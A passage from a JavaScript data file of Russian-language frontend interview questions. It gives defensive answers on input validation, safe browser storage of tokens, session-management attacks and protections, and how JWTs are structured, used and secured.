    answer: "<p><strong>Работа с пользовательским вводом</strong> требует постоянной бдительности и применения принципа \"никогда не доверяй\".</p><p><strong>Принцип \"Never Trust User Input\":</strong></p><ul><li>Любые данные от пользователя потенциально опасны</li><li>Включая данные из URL, форм, cookies, headers</li><li>Даже от \"доверенных\" пользователей</li><li>Валидировать и санитизировать всегда</li></ul><p><strong>1. Input Validation (Валидация входных данных):</strong></p><p><strong>Whitelist подход (предпочтительно):</strong></p><ul><li>Определить что РАЗРЕШЕНО</li><li>Отклонять всё остальное</li><li>Примеры: только буквы, только цифры, конкретный формат</li></ul><p><strong>Типы валидации:</strong></p><ul><li>Тип данных: число, строка, boolean</li><li>Формат: email, URL, дата</li><li>Диапазон: min/max длина, числовые пределы</li><li>Паттерны: регулярные выражения</li></ul><p><strong>2. Output Encoding (Кодирование вывода):</strong></p><p><strong>Context-aware encoding:</strong></p><ul><li>HTML контекст: &lt; → &amp;lt;, &gt; → &amp;gt;</li><li>JavaScript строки: ' → \\', \" → \\\"</li><li>URL параметры: encodeURIComponent()</li><li>CSS: специфичное экранирование</li></ul><p><strong>Кодировать при выводе, не при вводе:</strong></p><ul><li>Хранить данные в оригинальном виде</li><li>Кодировать когда отображаете</li><li>Разное кодирование для разных контекстов</li></ul><p><strong>3. Санитизация (Очистка данных):</strong></p><p><strong>Для HTML:</strong></p><ul><li>Использовать DOMPurify или аналоги</li><li>Whitelist разрешенных тегов</li><li>Удалять опасные атрибуты (onclick, onerror)</li></ul><p><strong>Для других типов:</strong></p><ul><li>SQL: параметризованные запросы</li><li>Shell команды: избегать или тщательно экранировать</li><li>File paths: канонизация, проверка на path traversal</li></ul><p><strong>4. Безопасные API:</strong></p><p><strong>Предпочитать безопасные методы:</strong></p><ul><li>✅ textContent вместо innerHTML</li><li>✅ createElement() вместо innerHTML</li><li>✅ setAttribute() вместо прямой манипуляции</li><li>✅ Параметризованные запросы вместо конкатенации SQL</li></ul><p><strong>Избегать опасных функций:</strong></p><ul><li>❌ eval()</li><li>❌ new Function(userInput)</li><li>❌ innerHTML с неочищенными данными</li><li>❌ document.write()</li><li>❌ setTimeout(stringCode)</li></ul><p><strong>5. Валидация на клиенте И сервере:</strong></p><p><strong>Клиентская валидация:</strong></p><ul><li>Для UX — быстрый фидбек</li><li>НЕ для безопасности (может быть обойдена)</li></ul><p><strong>Серверная валидация:</strong></p><ul><li>ОБЯЗАТЕЛЬНА для безопасности</li><li>Финальная проверка перед обработкой</li><li>Не доверять клиентским данным</li></ul><p><strong>6. Content Security Policy:</strong></p><ul><li>Дополнительный уровень защиты</li><li>Ограничивает источники скриптов</li><li>Блокирует inline код без nonce</li></ul><p><strong>7. Принцип наименьших привилегий:</strong></p><ul><li>Пользователь может вводить только необходимое</li><li>Ограничения на длину, формат, тип</li><li>Дропдауны вместо свободного ввода где возможно</li></ul><p><strong>8. Логирование и мониторинг:</strong></p><ul><li>Логировать подозрительный ввод</li><li>Мониторить паттерны атак</li><li>Алерты на множественные попытки</li></ul><p><strong>9. Rate Limiting:</strong></p><ul><li>Ограничение частоты запросов</li><li>Защита от brute force</li><li>Предотвращение abuse</li></ul><p><strong>10. Обработка файлов:</strong></p><p><strong>Загрузка файлов:</strong></p><ul><li>Валидация типа файла (не только расширение)</li><li>Ограничение размера</li><li>Сканирование антивирусом</li><li>Хранение вне webroot</li><li>Случайные имена файлов</li></ul><p><strong>11. Специфичные типы данных:</strong></p><p><strong>Email:</strong></p><ul><li>Валидация формата</li><li>НО полная RFC валидация сложна</li><li>Лучше — confirmation email</li></ul><p><strong>URL:</strong></p><ul><li>Валидация протокола (http/https)</li><li>Проверка на javascript: и data:</li><li>Canonical форма для сравнения</li></ul><p><strong>Числа:</strong></p><ul><li>Парсинг parseInt/parseFloat</li><li>Проверка диапазона</li><li>Обработка NaN, Infinity</li></ul><p><strong>Checklist безопасности:</strong></p><ul><li>✅ Валидация типа и формата</li><li>✅ Санитизация/кодирование при выводе</li><li>✅ Использование безопасных API</li><li>✅ Серверная проверка обязательна</li><li>✅ CSP настроен</li><li>✅ Логирование подозрительных данных</li><li>✅ Rate limiting на endpoints</li><li>✅ Регулярные security аудиты</li></ul>",
    difficulty: 'middle',
    tags: ['безопасность', 'валидация', 'санитизация', 'user input', 'best practices']
  },

  {
    id: 59,
    question: "Как правильно хранить чувствительные данные в браузере? localStorage vs cookies vs sessionStorage.",
    answer: "<p><strong>Хранение чувствительных данных в браузере</strong> требует понимания рисков и особенностей каждого механизма.</p><p><strong>Типы хранилищ и их безопасность:</strong></p><p><strong>1. HTTP-Only Cookies (самое безопасное для auth):</strong></p><p><strong>Особенности:</strong></p><ul><li>Недоступны для JavaScript (document.cookie)</li><li>Автоматически отправляются с запросами</li><li>Защита от XSS через HttpOnly флаг</li></ul><p><strong>Безопасная конфигурация:</strong></p><ul><li>Set-Cookie: sessionId=abc; HttpOnly; Secure; SameSite=Strict</li><li>HttpOnly — защита от XSS</li><li>Secure — только HTTPS</li><li>SameSite — защита от CSRF</li></ul><p><strong>Что хранить:</strong></p><ul><li>✅ Session tokens</li><li>✅ Authentication credentials</li><li>✅ CSRF tokens</li></ul><p><strong>2. localStorage (НЕ для чувствительных данных):</strong></p><p><strong>Риски:</strong></p><ul><li>❌ Доступен любому JavaScript на странице</li><li>❌ Уязвим к XSS атакам</li><li>❌ Нет автоматического истечения</li><li>❌ Нет защиты вроде HttpOnly</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Пользовательские настройки (тема, язык)</li><li>✅ Кэш некритичных данных</li><li>✅ Draft состояния форм</li><li>❌ НЕ для auth tokens</li><li>❌ НЕ для персональных данных</li></ul><p><strong>3. sessionStorage (чуть безопаснее localStorage):</strong></p><p><strong>Отличия от localStorage:</strong></p><ul><li>Удаляется при закрытии вкладки/окна</li><li>Не доступен другим вкладкам</li><li>Ограничен одной сессией браузера</li></ul><p><strong>Те же риски XSS:</strong></p><ul><li>❌ Доступен JavaScript</li><li>❌ Уязвим к XSS</li></ul><p><strong>Когда использовать:</strong></p><ul><li>✅ Временное состояние UI</li><li>✅ Multi-step form данные</li><li>✅ Временный кэш</li></ul><p><strong>Сравнение механизмов:</strong></p><table><tr><th>Свойство</th><th>HttpOnly Cookie</th><th>localStorage</th><th>sessionStorage</th></tr><tr><td>XSS защита</td><td>✅ Да</td><td>❌ Нет</td><td>❌ Нет</td></tr><tr><td>JS доступ</td><td>❌ Нет</td><td>✅ Да</td><td>✅ Да</td></tr><tr><td>Автоотправка</td><td>✅ Да</td><td>❌ Нет</td><td>❌ Нет</td></tr><tr><td>Размер</td><td>~4KB</td><td>~5-10MB</td><td>~5-10MB</td></tr><tr><td>Время жизни</td><td>Настраиваемо</td><td>Постоянно</td><td>До закрытия</td></tr></table><p><strong>Рекомендации по хранению:</strong></p><p><strong>Authentication tokens:</strong></p><ul><li>✅ Лучший вариант: HttpOnly Secure cookies</li><li>❌ Плохой вариант: localStorage</li><li>Причина: защита от XSS критична</li></ul><p><strong>JWT токены:</strong></p><p><strong>Вариант 1 — HttpOnly cookie (рекомендуется):</strong></p><ul><li>Токен в cookie, сервер парсит</li><li>Защита от XSS</li></ul><p><strong>Вариант 2 — localStorage + Authorization header:</strong></p><ul><li>fetch('/api', { headers: { 'Authorization': 'Bearer ' + token } })</li><li>Уязвимо к XSS</li><li>НО не подвержено CSRF (токен не отправляется автоматически)</li></ul><p><strong>Hybrid подход:</strong></p><ul><li>Access token — короткоживущий, в памяти JS</li><li>Refresh token — HttpOnly cookie</li><li>Баланс удобства и безопасности</li></ul><p><strong>Шифрование в браузере:</strong></p><p><strong>Web Crypto API:</strong></p><ul><li>Шифрование чувствительных данных перед хранением</li><li>crypto.subtle.encrypt()</li><li>НО ключ всё равно в браузере</li><li>Защита не от XSS, но от физического доступа</li></ul><p><strong>Ограничения шифрования:</strong></p><ul><li>Если злонамеленный JS выполнился (XSS)</li><li>Он может перехватить данные ДО шифрования</li><li>Шифрование не заменяет другие меры</li></ul><p><strong>Best Practices:</strong></p><ul><li>✅ HttpOnly cookies для auth данных</li><li>✅ Минимизировать хранение чувствительного в браузере</li><li>✅ Короткое время жизни токенов</li><li>✅ Используйте SameSite для cookies</li><li>✅ HTTPS везде (Secure flag)</li><li>✅ CSP для защиты от XSS</li><li>✅ Регулярная ротация токенов</li><li>✅ Logout должен очищать ВСЕ данные</li><li>❌ Никогда пароли в браузере</li><li>❌ Никогда API ключи в localStorage</li></ul><p><strong>Альтернативы браузерному хранению:</strong></p><ul><li>Server-side sessions — данные на сервере, только ID в cookie</li><li>Stateless JWT — краткосрочные токены</li><li>OAuth tokens — делегированная авторизация</li></ul>",
    difficulty: 'middle',
    tags: ['хранение данных', 'localStorage', 'cookies', 'безопасность', 'auth']
  },
  {
    id: 60,
    question: "Какие существуют атаки на session management и как защититься?",
    answer: "<p><strong>Session management</strong> — критичная часть безопасности веб-приложений, которая часто становится целью атак.</p><p><strong>Типы атак на сессии:</strong></p><p><strong>1. Session Hijacking (перехват сессии):</strong></p><p><strong>Как работает:</strong></p><ul><li>Злонамеленник получает session ID жертвы</li><li>Использует его для доступа к аккаунту</li><li>Выдает себя за легитимного пользователя</li></ul><p><strong>Методы получения session ID:</strong></p><ul><li>XSS — кража через document.cookie</li><li>Network sniffing — перехват в незашифрованном трафике</li><li>Man-in-the-Middle — подмена в пути</li><li>Malware на устройстве жертвы</li></ul><p><strong>Защита:</strong></p><ul><li>✅ HttpOnly cookies — защита от XSS</li><li>✅ Secure flag — только HTTPS</li><li>✅ HTTPS везде — защита от sniffing</li><li>✅ SameSite cookies — дополнительная защита</li><li>✅ Регенерация session ID после логина</li></ul><p><strong>2. Session Fixation (фиксация сессии):</strong></p><p><strong>Как работает:</strong></p><ol><li>Злонамеленник получает валидный session ID</li><li>Заставляет жертву использовать этот ID</li><li>Жертва логинится с известным ID</li><li>Злонамеленник использует тот же ID — авторизован</li></ol><p><strong>Пример атаки:</strong></p><ul><li>site.com?sessionId=attacker-known-id</li><li>Жертва логинится</li><li>Злонамеленник использует attacker-known-id</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Регенерация session ID при логине</li><li>✅ Отклонять session ID из URL параметров</li><li>✅ Использовать только server-generated session IDs</li><li>✅ Валидировать session при повышении привилегий</li></ul><p><strong>3. Session Prediction (предсказание сессии):</strong></p><p><strong>Проблема:</strong></p><ul><li>Слабый алгоритм генерации session ID</li><li>Предсказуемые паттерны (инкремент, timestamp)</li><li>Недостаточная энтропия</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Криптографически стойкие генераторы</li><li>✅ Достаточная длина ID (128+ бит)</li><li>✅ Использовать crypto.randomBytes()</li><li>✅ Избегать последовательных/предсказуемых ID</li></ul><p><strong>4. Cross-Site Request Forgery (CSRF):</strong></p><ul><li>Злонамеленный сайт использует сессию жертвы</li><li>Браузер автоматически отправляет session cookie</li><li>Действия выполняются от имени жертвы</li></ul><p><strong>Защита:</strong></p><ul><li>✅ CSRF токены</li><li>✅ SameSite cookies</li><li>✅ Проверка Origin/Referer</li><li>✅ Re-authentication для критичных операций</li></ul><p><strong>5. Session Timeout Issues:</strong></p><p><strong>Проблемы:</strong></p><ul><li>Слишком длинные сессии</li><li>Отсутствие idle timeout</li><li>Сессия не завершается при logout</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Разумное время жизни (15-30 минут idle)</li><li>✅ Absolute timeout (например, 24 часа)</li><li>✅ Корректный logout — удаление session</li><li>✅ Sliding expiration при активности</li></ul><p><strong>6. Concurrent Session Attacks:</strong></p><p><strong>Проблема:</strong></p><ul><li>Множество активных сессий одного пользователя</li><li>Украденный токен используется параллельно</li><li>Сложно обнаружить компрометацию</li></ul><p><strong>Защита:</strong></p><ul><li>✅ Ограничение числа активных сессий</li><li>✅ Logout из всех устройств при смене пароля</li><li>✅ Список активных сессий для пользователя</li><li>✅ Возможность terminate конкретную сессию</li></ul><p><strong>Best Practices для Session Management:</strong></p><p><strong>Генерация Session ID:</strong></p><ul><li>✅ Минимум 128 бит энтропии</li><li>✅ Криптографически стойкий RNG</li><li>✅ Без предсказуемых паттернов</li></ul><p><strong>Хранение на сервере:</strong></p><ul><li>✅ Хешировать session ID перед хранением</li><li>✅ Ассоциировать с IP, User-Agent (опционально)</li><li>✅ Хранить время создания и последней активности</li></ul><p><strong>Cookie конфигурация:</strong></p><ul><li>✅ HttpOnly — обязательно</li><li>✅ Secure — обязательно</li><li>✅ SameSite=Lax минимум, Strict лучше</li><li>✅ Правильный Path и Domain</li></ul><p><strong>Lifecycle управление:</strong></p><ul><li>✅ Регенерация при логине/logout</li><li>✅ Регенерация при изменении привилегий</li><li>✅ Автоматическое истечение</li><li>✅ Явное завершение при logout</li></ul><p><strong>Мониторинг и аудит:</strong></p><ul><li>✅ Логировать создание/удаление сессий</li><li>✅ Алерты на подозрительную активность</li><li>✅ Обнаружение множественных сессий</li><li>✅ Географические аномалии</li></ul><p><strong>Дополнительные меры:</strong></p><ul><li>✅ Двухфакторная аутентификация</li><li>✅ Device fingerprinting</li><li>✅ Behavioral analytics</li><li>✅ Rate limiting</li></ul>",
    difficulty: 'senior',
    tags: ['session management', 'безопасность', 'session hijacking', 'атаки', 'защита']
  },
  {
    id: 61,
    question: "Что такое JWT (JSON Web Token) и для каких целей он используется?",
    answer: "<p><strong>JWT (JSON Web Token)</strong> — это открытый стандарт (RFC 7519) для создания токенов доступа, которые позволяют передавать информацию между сторонами в компактном и безопасном виде.</p><p><strong>Основная идея JWT:</strong></p><ul><li>Самодостаточный токен, содержащий всю необходимую информацию</li><li>Не требует хранения состояния на сервере (stateless)</li><li>Подписан цифровой подписью для проверки подлинности</li><li>Компактный формат для передачи в HTTP заголовках</li></ul><p><strong>Основные цели использования:</strong></p><p><strong>1. Аутентификация:</strong></p><ul><li>После успешного логина сервер выдает JWT</li><li>Клиент отправляет токен с каждым запросом</li><li>Сервер проверяет подпись и извлекает данные пользователя</li><li>Не нужно обращаться к БД для проверки сессии</li></ul><p><strong>2. Обмен информацией:</strong></p><ul><li>Безопасная передача данных между сторонами</li><li>Подпись гарантирует, что данные не изменены</li><li>Можно проверить отправителя</li></ul><p><strong>3. Авторизация:</strong></p><ul><li>Токен содержит роли и права пользователя</li><li>Сервер проверяет разрешения без запроса к БД</li><li>Decentralized авторизация в микросервисах</li></ul><p><strong>Преимущества JWT:</strong></p><ul><li>✅ Stateless — сервер не хранит сессии</li><li>✅ Масштабируемость — любой сервер может валидировать</li><li>✅ Подходит для микросервисов и API</li><li>✅ Cross-domain — работает между доменами</li><li>✅ Мобильные приложения — удобная авторизация</li></ul><p><strong>Типичные сценарии использования:</strong></p><ul><li>Single Sign-On (SSO) — один токен для многих сервисов</li><li>Мобильные API — нет cookies, только токены</li><li>Микросервисная архитектура — независимая верификация</li><li>SPA приложения — хранение в localStorage/memory</li></ul>",
    difficulty: 'junior',
    tags: ['JWT', 'аутентификация', 'токены', 'безопасность']
  },

  {
    id: 62,
    question: "Какова структура JWT и какие компоненты входят в его состав?",
    answer: "<p><strong>JWT состоит из трёх частей</strong>, разделённых точками: Header.Payload.Signature</p><p><strong>1. Header (заголовок):</strong></p><p>Содержит метаданные о токене:</p><ul><li><strong>typ</strong> — тип токена, обычно 'JWT'</li><li><strong>alg</strong> — алгоритм подписи (HS256, RS256, ES256)</li></ul><p><strong>Пример:</strong></p><ul><li>{ \"alg\": \"HS256\", \"typ\": \"JWT\" }</li><li>Кодируется в Base64Url</li><li>Результат: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</li></ul><p><strong>2. Payload (полезная нагрузка):</strong></p><p>Содержит claims — утверждения о пользователе и данные:</p><p><strong>Стандартные claims (registered):</strong></p><ul><li><strong>iss</strong> (issuer) — кто выпустил токен</li><li><strong>sub</strong> (subject) — о ком токен (обычно user ID)</li><li><strong>aud</strong> (audience) — для кого предназначен</li><li><strong>exp</strong> (expiration) — время истечения (timestamp)</li><li><strong>nbf</strong> (not before) — не использовать до этого времени</li><li><strong>iat</strong> (issued at) — время создания</li><li><strong>jti</strong> (JWT ID) — уникальный ID токена</li></ul><p><strong>Пользовательские claims:</strong></p><ul><li>Любые данные: { \"userId\": 123, \"role\": \"admin\", \"email\": \"user@example.com\" }</li></ul><p><strong>Пример Payload:</strong></p><ul><li>{ \"sub\": \"1234567890\", \"name\": \"John Doe\", \"role\": \"admin\", \"iat\": 1516239022, \"exp\": 1516242622 }</li><li>Кодируется в Base64Url</li></ul><p><strong>⚠️ Важно:</strong> Payload НЕ зашифрован, только закодирован Base64. Любой может декодировать и прочитать. Не храните секреты в JWT!</p><p><strong>3. Signature (подпись):</strong></p><p>Обеспечивает целостность и подлинность:</p><p><strong>Как создаётся:</strong></p><ul><li>Берём закодированные Header и Payload</li><li>Объединяем через точку: encodedHeader.encodedPayload</li><li>Подписываем секретным ключом с указанным алгоритмом</li><li>HMACSHA256(base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret)</li></ul><p><strong>Назначение подписи:</strong></p><ul><li>✅ Проверяет что токен не изменён</li><li>✅ Подтверждает что токен создан доверенным сервером</li><li>❌ НЕ шифрует данные (данные видны всем)</li></ul><p><strong>Полный токен выглядит так:</strong></p><ul><li>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</li></ul><p><strong>Процесс декодирования:</strong></p><ol><li>Разделить по точкам на 3 части</li><li>Base64Url декодировать Header и Payload</li><li>Проверить подпись используя секретный ключ</li><li>Если подпись валидна — токен подлинный</li></ol><p><strong>Base64Url кодирование:</strong></p><ul><li>Похоже на обычный Base64</li><li>НО: + заменяется на -, / на _, убираются =</li><li>Безопасно для URL и HTTP заголовков</li></ul>",
    difficulty: 'junior',
    tags: ['JWT', 'структура', 'Header', 'Payload', 'Signature']
  },

  {
    id: 63,
    question: "Опишите механизм работы аутентификации с помощью JWT",
    answer: "<p><strong>Процесс аутентификации с JWT</strong> состоит из нескольких этапов:</p><p><strong>Шаг 1 — Логин (получение токена):</strong></p><ol><li>Пользователь отправляет credentials (email, пароль)</li><li>Сервер проверяет данные в БД</li><li>Если верно — сервер создаёт JWT с данными пользователя</li><li>Сервер отправляет JWT клиенту</li></ol><p><strong>Пример ответа:</strong></p><ul><li>{ \"accessToken\": \"eyJhbGc...\", \"tokenType\": \"Bearer\", \"expiresIn\": 3600 }</li></ul><p><strong>Шаг 2 — Хранение токена на клиенте:</strong></p><p><strong>Варианты хранения:</strong></p><ul><li>В памяти JavaScript (переменная) — самое безопасное, но теряется при перезагрузке</li><li>localStorage — удобно, но уязвимо к XSS</li><li>sessionStorage — удаляется при закрытии вкладки</li><li>HttpOnly cookie — защита от XSS, но нужна защита от CSRF</li></ul><p><strong>Шаг 3 — Отправка токена с запросами:</strong></p><p><strong>Стандартный способ — Authorization заголовок:</strong></p><ul><li>Authorization: Bearer eyJhbGciOiJIUzI1NiIs...</li><li>\"Bearer\" — тип токена (схема аутентификации)</li><li>Отправляется с каждым API запросом</li></ul><p><strong>Пример fetch запроса:</strong></p><ul><li>fetch('/api/data', { headers: { 'Authorization': `Bearer ${token}` } })</li></ul><p><strong>Шаг 4 — Верификация на сервере:</strong></p><ol><li>Сервер извлекает токен из заголовка</li><li>Проверяет подпись с помощью секретного ключа</li><li>Если подпись валидна — токен подлинный</li><li>Проверяет exp (время истечения)</li><li>Извлекает данные из payload (userId, role)</li><li>Выполняет запрос с правами пользователя</li></ol><p><strong>Псевдокод верификации:</strong></p><ul><li>const token = req.headers.authorization?.split(' ')[1];</li><li>const decoded = jwt.verify(token, SECRET_KEY);</li><li>if (decoded.exp < Date.now() / 1000) throw 'expired';</li><li>req.user = decoded; // userId, role и т.д.</li></ul><p><strong>Шаг 5 — Обработка истечения токена:</strong></p><p><strong>Access Token истёк:</strong></p><ul><li>Сервер возвращает 401 Unauthorized</li><li>Клиент пытается обновить токен</li></ul><p><strong>Refresh Token механизм:</strong></p><ol><li>Access token — короткий (15 минут), для API запросов</li><li>Refresh token — длинный (7 дней), для обновления access token</li><li>Когда access истёк — отправляем refresh token</li><li>Сервер выдаёт новый access token</li><li>Если refresh истёк — требуется повторный логин</li></ol><p><strong>Шаг 6 — Logout:</strong></p><p><strong>На клиенте:</strong></p><ul><li>Удалить токен из хранилища</li><li>localStorage.removeItem('token')</li><li>Очистить состояние приложения</li></ul><p><strong>На сервере (опционально):</strong></p><ul><li>JWT stateless, но можно добавить blacklist</li><li>Сохранить jti (token ID) в Redis с TTL = exp</li><li>При верификации проверять не в blacklist ли</li></ul><p><strong>Полный flow:</strong></p><ol><li>👤 POST /auth/login { email, password }</li><li>🔐 Сервер проверяет, создаёт JWT</li><li>← { accessToken, refreshToken }</li><li>💾 Клиент сохраняет токены</li><li>🔄 GET /api/data + Authorization: Bearer token</li><li>✅ Сервер верифицирует и отвечает</li><li>⏰ Access token истёк → 401</li><li>🔄 POST /auth/refresh { refreshToken }</li><li>← { accessToken }</li><li>🚪 Logout — удаление токенов</li></ol><p><strong>Важные детали:</strong></p><ul><li>✅ Токен передаётся в каждом запросе</li><li>✅ Сервер не хранит сессии (stateless)</li><li>✅ Любой сервер может валидировать токен</li><li>✅ Масштабируемость из коробки</li></ul>",
    difficulty: 'middle',
    tags: ['JWT', 'аутентификация', 'flow', 'механизм работы']
  },

  {
    id: 64,
    question: "Как JWT отличается от традиционных методов аутентификации, таких как использование сессий?",
    answer: "<p><strong>Сравнение JWT и Session-based аутентификации</strong> показывает фундаментальные различия в подходах.</p><p><strong>Session-based аутентификация:</strong></p><p><strong>Как работает:</strong></p><ol><li>Пользователь логинится</li><li>Сервер создаёт session в БД/памяти</li><li>Клиенту отправляется session ID в cookie</li><li>Cookie автоматически отправляется с каждым запросом</li><li>Сервер находит session по ID и проверяет</li></ol><p><strong>JWT аутентификация:</strong></p><p><strong>Как работает:</strong></p><ol><li>Пользователь логинится</li><li>Сервер создаёт JWT с данными пользователя</li><li>JWT отправляется клиенту</li><li>Клиент сохраняет и отправляет в заголовке</li><li>Сервер верифицирует подпись без обращения к БД</li></ol><p><strong>Ключевые отличия:</strong></p><table><tr><th>Аспект</th><th>Sessions</th><th>JWT</th></tr><tr><td>Хранение состояния</td><td>Stateful (сервер хранит)</td><td>Stateless (всё в токене)</td></tr><tr><td>Хранилище</td><td>БД/Redis/память сервера</td><td>Клиент хранит токен</td></tr><tr><td>Масштабируемость</td><td>Сложнее (нужна синхронизация)</td><td>Легко (любой сервер валидирует)</td></tr><tr><td>Размер данных</td><td>Только ID (~20 байт)</td><td>Полные данные (~200-500 байт)</td></tr><tr><td>База данных</td><td>Запрос при каждой проверке</td><td>Нет запросов</td></tr><tr><td>Отзыв токена</td><td>Просто (удалить session)</td><td>Сложно (нужен blacklist)</td></tr><tr><td>Время жизни</td><td>Гибкое управление</td><td>Фиксировано при создании</td></tr></table><p><strong>Преимущества Sessions:</strong></p><ul><li>✅ Мгновенный logout — удалил session</li><li>✅ Полный контроль на сервере</li><li>✅ Можно обновлять права без relogin</li><li>✅ Меньше трафика (только ID)</li><li>✅ Легче управлять активными сессиями</li></ul><p><strong>Недостатки Sessions:</strong></p><ul><li>❌ Stateful — нужно хранить на сервере</li><li>❌ Масштабирование — нужна синхронизация или sticky sessions</li><li>❌ Запросы к БД для каждой проверки</li><li>❌ CORS сложности с cookies</li><li>❌ Мобильные приложения — cookies неудобны</li></ul><p><strong>Преимущества JWT:</strong></p><ul><li>✅ Stateless — сервер не хранит</li><li>✅ Горизонтальное масштабирование без проблем</li><li>✅ Нет запросов к БД для верификации</li><li>✅ Работает везде (mobile, SPA, API)</li><li>✅ Микросервисы — каждый сервис валидирует</li><li>✅ Cross-domain — легко передавать</li></ul><p><strong>Недостатки JWT:</strong></p><ul><li>❌ Невозможно отозвать до истечения (нужен blacklist)</li><li>❌ Больше трафика (полные данные)</li><li>❌ Данные в токене могут устареть</li><li>❌ XSS уязвимость если в localStorage</li><li>❌ Сложнее обновлять права пользователя</li></ul><p><strong>Когда использовать Sessions:</strong></p><ul><li>Монолитные приложения</li><li>Когда нужен строгий контроль сессий</li><li>Важен мгновенный logout</li><li>Данные пользователя часто меняются</li><li>Нет проблем с масштабированием</li></ul><p><strong>Когда использовать JWT:</strong></p><ul><li>Микросервисная архитектура</li><li>Мобильные приложения</li><li>SPA с отдельным API</li><li>Горизонтальное масштабирование</li><li>Cross-domain сценарии</li><li>Stateless API</li></ul><p><strong>Гибридный подход (лучшее из обоих):</strong></p><ul><li>JWT для access token (короткоживущий, 15 мин)</li><li>Session для refresh token (хранится на сервере)</li><li>Баланс между производительностью и контролем</li></ul><p><strong>Практические различия:</strong></p><p><strong>Logout в Sessions:</strong></p><ul><li>DELETE /sessions/current → удалить из БД → мгновенный эффект</li></ul><p><strong>Logout в JWT:</strong></p><ul><li>Удалить токен на клиенте</li><li>Токен всё ещё валиден до exp</li><li>Нужен blacklist для \"реального\" logout</li></ul><p><strong>Обновление прав в Sessions:</strong></p><ul><li>Обновить данные в session store → эффект сразу</li></ul><p><strong>Обновление прав в JWT:</strong></p><ul><li>Токен содержит старые права до exp</li><li>Нужно ждать истечения или принудительно обновлять</li></ul>",
    difficulty: 'middle',
    tags: ['JWT', 'sessions', 'сравнение', 'аутентификация', 'stateless']
  },

  {
    id: 65,
    question: "Как обрабатывать и обеспечивать безопасность JWT на стороне сервера и клиента?",
    answer: "<p><strong>Безопасность JWT</strong> требует правильной реализации на обеих сторонах.</p><p><strong>Безопасность на стороне сервера:</strong></p><p><strong>1. Выбор сильного алгоритма подписи:</strong></p><ul><li>✅ RS256 (RSA) — асимметричное шифрование, публичный ключ для проверки</li><li>✅ ES256 (ECDSA) — быстрее RSA, хорошая безопасность</li><li>✅ HS256 (HMAC) — симметричное, требует защиты секрета</li><li>❌ Избегать 'none' алгоритм (без подписи!)</li></ul><p><strong>2. Безопасное хранение секретного ключа:</strong></p><ul><li>❌ НЕ хардкодить в коде</li><li>✅ Переменные окружения (process.env.JWT_SECRET)</li><li>✅ Secrets management (AWS Secrets Manager, HashiCorp Vault)</li><li>✅ Минимум 256 бит случайности</li><li>✅ Регулярная ротация ключей</li></ul><p><strong>3. Установка правильного exp (expiration):</strong></p><ul><li>Access token — короткий срок (15 минут)</li><li>Refresh token — дольше (7 дней, но с ротацией)</li><li>Баланс между UX и безопасностью</li></ul><p><strong>4. Валидация всех claims:</strong></p><ul><li>✅ Проверять exp — токен не истёк</li><li>✅ Проверять nbf — не используется раньше времени</li><li>✅ Проверять iss — правильный issuer</li><li>✅ Проверять aud — токен для нас</li></ul><p><strong>5. Защита от подмены алгоритма:</strong></p><ul><li>❌ Уязвимость: сменить alg на 'none'</li><li>✅ Явно указывать ожидаемый алгоритм при верификации</li><li>✅ jwt.verify(token, secret, { algorithms: ['HS256'] })</li><li>❌ НЕ доверять alg из заголовка безусловно</li></ul><p><strong>6. Реализация Refresh Token механизма:</strong></p><ul><li>Refresh token хранится в БД</li><li>Возможность отозвать (удалить из БД)</li><li>Rotation — новый refresh при каждом использовании</li><li>Reuse detection — если старый refresh использован, отозвать все</li></ul><p><strong>7. Blacklist для отозванных токенов:</strong></p><ul><li>Redis с TTL = время до exp</li><li>Сохранять jti (token ID) при logout</li><li>Проверять при каждой валидации</li></ul><p><strong>8. Rate Limiting:</strong></p><ul><li>Ограничение попыток refresh</li><li>Защита от brute force</li></ul><p><strong>Безопасность на стороне клиента:</strong></p><p><strong>1. Безопасное хранение токена:</strong></p><p><strong>Варианты и риски:</strong></p><table><tr><th>Способ</th><th>XSS риск</th><th>CSRF риск</th><th>Рекомендация</th></tr><tr><td>localStorage</td><td>❌ Высокий</td><td>✅ Низкий</td><td>Избегать для auth</td></tr><tr><td>sessionStorage</td><td>❌ Высокий</td><td>✅ Низкий</td><td>Лучше localStorage</td></tr><tr><td>Memory (JS переменная)</td><td>⚠️ Средний</td><td>✅ Низкий</td><td>✅ Лучший</td></tr><tr><td>HttpOnly Cookie</td><td>✅ Низкий</td><td>❌ Высокий</td><td>С CSRF защитой</td></tr></table><p><strong>Рекомендуемый подход:</strong></p><ul><li>Access token — в памяти JS (переменная)</li><li>Refresh token — HttpOnly cookie</li><li>При перезагрузке — refresh для нового access</li></ul><p><strong>2. Защита от XSS:</strong></p><ul><li>✅ Content Security Policy (CSP)</li><li>✅ Санитизация пользовательского ввода</li><li>✅ Избегать innerHTML с user data</li><li>✅ Использовать фреймворки с auto-escaping</li><li>✅ Не хранить токен в localStorage если возможна XSS</li></ul><p><strong>3. Защита от CSRF (если токен в cookie):</strong></p><ul><li>✅ SameSite=Strict для cookie</li><li>✅ CSRF токены для state-changing операций</li><li>✅ Проверка Origin/Referer заголовков</li></ul><p><strong>4. HTTPS обязательно:</strong></p><ul><li>Токен передаётся в каждом запросе</li><li>HTTP — токен в plain text</li><li>Man-in-the-middle может украсть</li></ul><p><strong>5. Обработка истечения:</strong></p><ul><li>Отлавливать 401 ошибки</li><li>Автоматический refresh</li><li>Redirect на login если refresh тоже истёк</li></ul><p><strong>6. Не хранить чувствительные данные в JWT:</strong></p><ul><li>JWT можно декодировать без ключа</li><li>❌ НЕ хранить: пароли, кредитки, секреты</li><li>✅ Хранить: userId, role, email</li></ul><p><strong>Best Practices:</strong></p><p><strong>Сервер:</strong></p><ul><li>✅ Короткий exp для access token</li><li>✅ Сильный секретный ключ (256+ бит)</li><li>✅ Явная проверка алгоритма</li><li>✅ Валидация всех claims</li><li>✅ Refresh token механизм</li><li>✅ Логирование подозрительной активности</li></ul><p><strong>Клиент:</strong></p><ul><li>✅ 